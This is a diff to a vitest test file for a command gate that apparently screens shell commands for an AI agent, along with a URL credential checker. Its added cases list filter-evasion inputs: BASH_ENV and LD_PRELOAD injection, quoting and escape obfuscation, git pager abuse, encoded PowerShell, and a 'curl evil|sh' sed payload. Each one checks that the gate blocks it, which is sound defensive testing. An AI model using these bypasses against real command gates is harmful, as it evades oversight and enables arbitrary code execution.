@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { isShellEscape } from "../src/adapters/commandGate.js";
+import { isCredentialFreeHttpUrl, isShellEscape } from "../src/adapters/commandGate.js";
 
 describe("isShellEscape (codex re-review P1-2)", () => {
   it("catches plain -c and combined flag clusters on shells", () => {
@@ -24,6 +24,29 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("sh -c evil", [])).toBe(true);
     expect(isShellEscape("node -e evil", [])).toBe(true);
     expect(isShellEscape("eval", [])).toBe(true);
+    expect(isShellEscape("env BASH_ENV=./payload.sh bash", [])).toBe(true);
+    expect(isShellEscape("find . -exec node {} ;", [])).toBe(true);
+    expect(isShellEscape("npm run format && ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("echo $(./payload.sh)", [])).toBe(true);
+    expect(isShellEscape("BASH_ENV=./payload.sh bash", [])).toBe(true);
+    expect(isShellEscape("LD_PRELOAD=./payload.so /bin/true", [])).toBe(true);
+    expect(isShellEscape("${SHELL} -c ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("PATH=./payload:$PATH git status", [])).toBe(true);
+    expect(isShellEscape("e'n'v BASH_ENV=./payload.sh bash", [])).toBe(true);
+    expect(isShellEscape("git difftool --extcmd=./payload.sh", [])).toBe(true);
+    expect(isShellEscape("git config core.pager '!./payload.sh'", [])).toBe(true);
+    expect(isShellEscape("git -ccore.editor=./payload status", [])).toBe(true);
+    expect(isShellEscape('"ba"sh -c ./payload.sh', [])).toBe(true);
+    expect(isShellEscape("b\\ash -c ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("$'ignored; literal' && ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("printf $'safe\\nliteral'", [])).toBe(true);
+    expect(isShellEscape("bash -'c' ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("bash -\\c ./payload.sh", [])).toBe(true);
+    expect(isShellEscape("e${ANY:+}nv BASH_ENV=./payload.sh bash", [])).toBe(true);
+    expect(isShellEscape("git diff --ext'-diff'", [])).toBe(true);
+    expect(
+      isShellEscape("..\\//../../../../../../../../../../bin/b\\ash -c ./payload.sh", []),
+    ).toBe(true);
     expect(isShellEscape("", [])).toBe(true);
   });
 
@@ -38,11 +61,29 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("lua", ["-e", 'os.execute("x")'])).toBe(true);
     expect(isShellEscape("Rscript", ["-e", 'system("x")'])).toBe(true);
     expect(isShellEscape("osascript", ["-e", 'do shell script "x"'])).toBe(true);
+    expect(isShellEscape("powershell", ["-Command", "Invoke-WebRequest evil"])).toBe(true);
+    expect(isShellEscape('pwsh -EncodedCommand "fixture"', [])).toBe(true);
     // GNU sed executes via the s///e flag.
     expect(isShellEscape("sed", ["s/.*/curl evil|sh/e"])).toBe(true);
     // single-string forms
     expect(isShellEscape("awk 'BEGIN{system(\"x\")}'", [])).toBe(true);
     expect(isShellEscape("php -r 'system(1)'", [])).toBe(true);
+  });
+
+  it("catches Windows shell executable aliases and abbreviated execution flags", () => {
+    expect(isShellEscape("powershell.exe", ["-Command", "evil"])).toBe(true);
+    expect(isShellEscape("powershell.exe", ["-enc", "fixture"])).toBe(true);
+    expect(isShellEscape("pwsh.exe", ["-EncodedCommand", "fixture"])).toBe(true);
+    expect(isShellEscape("cmd.exe", ["/c", "evil"])).toBe(true);
+    expect(isShellEscape("cmd", ["/k", "evil"])).toBe(true);
+    expect(isShellEscape("powershell.exe -enc fixture", [])).toBe(true);
+    expect(isShellEscape("powershell.exe -NoProfile -c evil", [])).toBe(true);
+    expect(isShellEscape("cmd.exe /c evil", [])).toBe(true);
+    expect(isShellEscape("cmd.exe /d /s /c evil", [])).toBe(true);
+    expect(isShellEscape("cmd.exe", ["script.cmd"])).toBe(true);
+    expect(isShellEscape("powershell", ["script.ps1"])).toBe(true);
+    expect(isShellEscape("%COMSPEC% /d /s /c evil", [])).toBe(true);
+    expect(isShellEscape("%COMSPEC:~-7% /d /s /c evil", [])).toBe(true);
   });
 
   it("rejects indirection/exec wrappers that smuggle execution past the gate (security-reviewer C1)", () => {
@@ -76,7 +117,46 @@ describe("isShellEscape (codex re-review P1-2)", () => {
     expect(isShellEscape("busybox", ["ls", "-la"])).toBe(false);
     // a plain sed substitution with no execute flag is fine.
     expect(isShellEscape("sed", ["s/foo/bar/", "file.txt"])).toBe(false);
+    expect(isShellEscape("powershell", ["-NoProfile", "-File", "script.ps1"])).toBe(false);
+    expect(isShellEscape("powershell", ["-NoProfile", "-f", "script.ps1"])).toBe(false);
+    expect(isShellEscape("echo", ["cmd"])).toBe(false);
+    expect(isShellEscape("printf", ["pwsh", "is a literal argument"])).toBe(false);
+    expect(isShellEscape("printf 'safe; literal'", [])).toBe(false);
+    expect(isShellEscape("git diff -c", [])).toBe(false);
+    expect(isShellEscape('"C:\\Program Files\\tool.exe" --serve', [])).toBe(false);
+    expect(isShellEscape("bash ${CLAUDE_PROJECT_DIR}/.claude/hooks/fmt.sh", [])).toBe(
+      false,
+    );
+    expect(isShellEscape("bash $HOME/.claude/hooks/fmt.sh", [])).toBe(false);
     // `-c` as a non-flag positional for a non-shell binary is fine.
     expect(isShellEscape("grep", ["-c", "pattern"])).toBe(false);
+  });
+});
+
+describe("isCredentialFreeHttpUrl", () => {
+  it("accepts plain HTTP(S) MCP endpoints", () => {
+    expect(isCredentialFreeHttpUrl("https://example.com/mcp")).toBe(true);
+    expect(isCredentialFreeHttpUrl("http://localhost:3000/mcp")).toBe(true);
+    expect(isCredentialFreeHttpUrl("https://example.com/tokenize/mcp")).toBe(true);
+    expect(isCredentialFreeHttpUrl("https://example.com/passwordless/mcp")).toBe(true);
+  });
+
+  it("rejects credentials, parameters, fragments, and non-HTTP schemes", () => {
+    for (const value of [
+      "https://user:secret@example.com/mcp",
+      "https://example.com/mcp?token=secret",
+      "https://example.com/mcp#secret",
+      "https://example.com/s/fixture-secret/mcp",
+      "https://example.com/mcp;access_token=fixture-secret",
+      "https://example.com/s/sk-live-1234567890/mcp",
+      "https://example.com/session/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig",
+      "https://example.com/password/fixture-secret/mcp",
+      "https://example.com/access_token/fixture-secret/mcp",
+      "https://example.com/api-key/fixture-secret/mcp",
+      "file:///tmp/mcp",
+      "not a URL",
+    ]) {
+      expect(isCredentialFreeHttpUrl(value)).toBe(false);
+    }
   });
 });
